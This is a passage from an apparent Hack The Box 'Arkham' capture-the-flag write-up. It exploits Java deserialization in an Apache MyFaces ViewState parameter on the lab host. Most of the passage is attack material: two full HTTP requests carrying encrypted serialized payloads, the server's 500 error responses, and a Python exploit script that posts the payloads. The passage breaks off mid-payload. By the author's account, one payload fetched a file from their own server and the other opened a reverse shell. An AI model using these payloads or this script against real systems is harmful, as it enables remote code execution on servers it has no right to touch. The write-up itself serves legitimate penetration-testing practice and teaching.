+j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BTweGj5FUR%2FlCPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPSGioyPZd%2FiNpmNoUDeaeXEVrvY0L%2FaRMkBoThhoybIwKm9JRORG5quVg7mI39K3ANZaw6BBLyJDVbXmOcpydaV%2BJ4ehZuDU5EJNCdYdlqpK5IUgV5VNtTWO9f9YgPaneg14o%2B53eYRjgAQvWxmK%2FVII6JP9zUlbTzD60JeAbleovB8fLJf0D3aUv3mla%2B%2FLyWEXo2NfiqjFqPb9b4NHR199UdBVp6X2nev37%2Ftu0vBXvZz%2Bls4886hDPhV3RdASjsJaoZPrEReF8f43oev%2Bx6ZHIUdkCdk5uThniTrXeAWImx1USbtujkG0xSYdfK%2Fs8Az9gV7hyTmqI0ewkaYsX9uSA%2F9wVoArXnRX%2FrTg7PxMp9hGNKQN%2Fklr%2BXyc%3D
+</code></pre></div></div>
+<p><br /> Response :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 500 
+Content-Type: text/html;charset=utf-8
+Content-Language: en
+Content-Length: 2570
+Date: Fri, 09 Aug 2019 18:36:52 GMT
+Connection: close
+
+<span class="cp">&lt;!doctype html&gt;</span><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;&lt;head&gt;&lt;title&gt;</span>HTTP Status 500 â Internal Server Error<span class="nt">&lt;/title&gt;&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;h1</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">22px</span><span class="p">;}</span> <span class="nt">h2</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">16px</span><span class="p">;}</span> <span class="nt">h3</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;}</span> <span class="nt">body</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="no">white</span><span class="p">;}</span> <span class="nt">b</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;}</span> <span class="nt">p</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">background</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">12px</span><span class="p">;}</span> <span class="nt">a</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nt">a</span><span class="nc">.name</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nc">.line</span> <span class="p">{</span><span class="nl">height</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">border</span><span class="p">:</span><span class="nb">none</span><span class="p">;}</span><span class="nt">&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;</span>HTTP Status 500 â Internal Server Error<span class="nt">&lt;/h1&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;p&gt;&lt;b&gt;</span>Type<span class="nt">&lt;/b&gt;</span> Exception Report<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Message<span class="nt">&lt;/b&gt;</span> class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>; [Ljava.lang.Object; is in module java.base of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>)<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Description<span class="nt">&lt;/b&gt;</span> The server encountered an unexpected condition that prevented it from fulfilling the request.<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Exception<span class="nt">&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;</span>java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>; [Ljava.lang.Object; is in module java.base of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>)
+        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
+        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
+        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
+        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)
+        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)
+        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
+        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
+        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
+        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
+<span class="nt">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;</span>Note<span class="nt">&lt;/b&gt;</span> The full stack trace of the root cause is available in the server logs.<span class="nt">&lt;/p&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;h3&gt;</span>Apache Tomcat/8.5.37<span class="nt">&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+<p><br /> I got a 500, and when I checked my python server I saw that I got a request so everything is fine.
+<br /> 2nd Request :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
+Host: arkham.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://arkham.htb:8080/userSubscribe.faces
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3109
+Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRvyB%2F2m0z59yPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VagG4ZxblvAnvEIlw06ZZ5I0FbIXQZD0hxEVL%2FVgEmicZbJY6G4sqBwTtsZahAdOH9EIpPlR1Lk2x5bUT15gaZNEWJ%2BgSEfhKSsMjBwS3fvkuOvKtC8ttV3HZjlugWuZSt5XvisFw2swkCBSZsRlmf8rDIwcEt375HX%2FLlXyNL0Oc117xPruVt3hwVMXWIvRWU%2B1LfoOx%2BOAo66bHdBWC0UFv1HE5WCU3IPKGs6NPijKqJWULKKxdYHba3wuN9N4KGU6y1DQGkboG9trDs8z3Vv17f0whCQpR392T%2FgkPJdE2M0q797EOI1suR5UQIOUxEyYZ50%3D
+</code></pre></div></div>
+<p><br /> Response :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 500 
+Content-Type: text/html;charset=utf-8
+Content-Language: en
+Content-Length: 2570
+Date: Fri, 09 Aug 2019 18:38:50 GMT
+Connection: close
+
+<span class="cp">&lt;!doctype html&gt;</span><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;&lt;head&gt;&lt;title&gt;</span>HTTP Status 500 â Internal Server Error<span class="nt">&lt;/title&gt;&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;h1</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">22px</span><span class="p">;}</span> <span class="nt">h2</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">16px</span><span class="p">;}</span> <span class="nt">h3</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;}</span> <span class="nt">body</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="no">white</span><span class="p">;}</span> <span class="nt">b</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;}</span> <span class="nt">p</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">background</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">12px</span><span class="p">;}</span> <span class="nt">a</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nt">a</span><span class="nc">.name</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nc">.line</span> <span class="p">{</span><span class="nl">height</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">border</span><span class="p">:</span><span class="nb">none</span><span class="p">;}</span><span class="nt">&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;</span>HTTP Status 500 â Internal Server Error<span class="nt">&lt;/h1&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;p&gt;&lt;b&gt;</span>Type<span class="nt">&lt;/b&gt;</span> Exception Report<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Message<span class="nt">&lt;/b&gt;</span> class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>; [Ljava.lang.Object; is in module java.base of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>)<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Description<span class="nt">&lt;/b&gt;</span> The server encountered an unexpected condition that prevented it from fulfilling the request.<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Exception<span class="nt">&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;</span>java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>; [Ljava.lang.Object; is in module java.base of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>)
+        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
+        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
+        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
+        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)
+        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)
+        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
+        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
+        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
+        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
+<span class="nt">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;</span>Note<span class="nt">&lt;/b&gt;</span> The full stack trace of the root cause is available in the server logs.<span class="nt">&lt;/p&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;h3&gt;</span>Apache Tomcat/8.5.37<span class="nt">&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+<p><br /> Then I checked my listener, and :
+<img src="/images/hackthebox/arkham/11.png" alt="" />
+<br /> We owned user !
+<br /> I also scripted this because copying and pasting in burp wasn’t my favorite thing and it only takes 2 minutes to script this in python :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+	<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"j_id_jsp_1623871077_1:email"</span> <span class="p">:</span> <span class="s">"test"</span> <span class="p">,</span> <span class="s">"j_id_jsp_1623871077_1:submit"</span> <span class="p">:</span> <span class="s">"SIGN UP"</span> <span class="p">,</span> <span class="s">"j_id_jsp_1623871077_1_SUBMIT"</span> <span class="p">:</span> <span class="s">"1"</span> <span class="p">,</span> <span class="s">"javax.faces.ViewState"</span> <span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
+	<span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.130:8080/userSubscribe.faces"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+
+<span class="n">upload_payload</span> <span class="o">=</span> <span class="s">"o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt+Eq3hlEwGdEWrah3tqcdo5Gxzenm+TobetH0+aG8+iCEB1RbCm7b/RwuOINGcnD+FO3DfRKu9gMF+hys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT/xmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml/ErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN+IjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV+TjkS1FnVO/oHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM/8vhiJvs7XB/iL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w/fqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9/CCnMkGLK3TD9+qV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje+WBoE1cgT2Ozo+us8jmf0nBttP8g/GkIl6LoObMsC3BpXUjNHX/l6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH+sV3gx3v3PoFcpnc1+AJTHWKqHfCy1opEh7cDv2tdwg/TiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI+CoX/OuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv/vNvILq22We0wQ1mUW3OrpauOZzU7+mQoL+GnNtOpmFx/zHz9CO1Qw3PfdQHYhQvw4tg/W90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x+f6+nW9kb/3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G/q7MLUp4+GPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas+cLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE/sAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS+/+6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL+3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK+PGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ+F0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5m